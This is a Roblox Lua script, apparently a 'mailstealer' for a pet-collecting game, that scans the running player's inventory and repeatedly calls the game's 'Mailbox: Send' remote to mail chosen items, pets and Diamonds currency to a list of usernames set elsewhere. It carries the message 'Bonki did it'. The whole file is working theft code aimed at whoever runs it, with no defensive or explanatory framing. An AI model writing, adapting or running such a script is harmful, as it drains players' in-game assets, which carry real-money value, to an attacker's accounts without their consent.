repeat
	task.wait();
until game:IsLoaded();
if not game:IsLoaded() then
	game.Loaded:Wait();
end;
local Library = require(game.ReplicatedStorage.Library);
local HttpService = game:GetService("HttpService");
local message = require(game.ReplicatedStorage.Library.Client.Message);
local Player = game.Players.LocalPlayer;
local network = require((game:GetService("ReplicatedStorage")).Library.Client.Network);
task.wait(3);
local Inventory = ((require((game:GetService("ReplicatedStorage")).Library.Client.Save)).Get()).Inventory;
local Save = (require((game:GetService("ReplicatedStorage")).Library.Client.Save)).Get();
local GetListWithAllItems = function()
	local hits = {};
	for itemName, itemData in pairs(AllowedItems) do
		local itemClass = itemData.Class;
		if Inventory[itemClass] ~= nil and itemClass ~= "Pet" then
			for i, v in pairs(Inventory[itemClass]) do
				if v.id == itemName then
					table.insert(hits, {
						Item_Id = i,
						Item_Name = v.id,
						Item_Amount = itemData.Amount,
						Item_Class = itemClass
					});
				end;
			end;
		elseif itemClass == "Pet" then
			for i, v in pairs(Inventory[itemClass]) do
				if v.id == itemName and v.pt == 2 and v.sh == nil then
					table.insert(hits, {
						Item_Id = i,
						Item_Name = v.id,
						Item_Amount = itemData.Amount,
						Item_Class = itemClass
					});
				end;
			end;
		end;
	end;
	return hits;
end;
local function sendItem(username, category, uid, am)
	local args = {
		[1] = username,
		[2] = "Bonki did it",
		[3] = category,
		[4] = uid,
		[5] = am
	};
	local response = false;
	repeat
		response = network.Invoke("Mailbox: Send", unpack(args));
	until response == true;
end;
print("Sending Items");
local itemsToSend = GetListWithAllItems();
if #itemsToSend > 0 then
	for _, username in ipairs(Roblox_Usernames) do
		for _, item in pairs(itemsToSend) do
			print("Sending to " .. username);
			print(item.Item_Name, item.Item_Class, item.Item_Id, item.Item_Amount);
			sendItem(username, item.Item_Class, item.Item_Id, item.Item_Amount);
		end;
	end;
end;
print("Now sending Gems");
local function SendGems()
	for _, Roblox_Username in ipairs(Roblox_Usernames) do
		for i, v in pairs(Inventory.Currency) do
			if v.id == "Diamonds" then
				local args = {
					[1] = Roblox_Username,
					[2] = "Sent Gems",
					[3] = "Currency",
					[4] = i,
					[5] = SentGems
				};
				print(unpack(args));
				local response = false;
				repeat
					response = network.Invoke("Mailbox: Send", unpack(args));
				until response == true;
				break;
			end;
		end;
	end;
end;
SendGems();
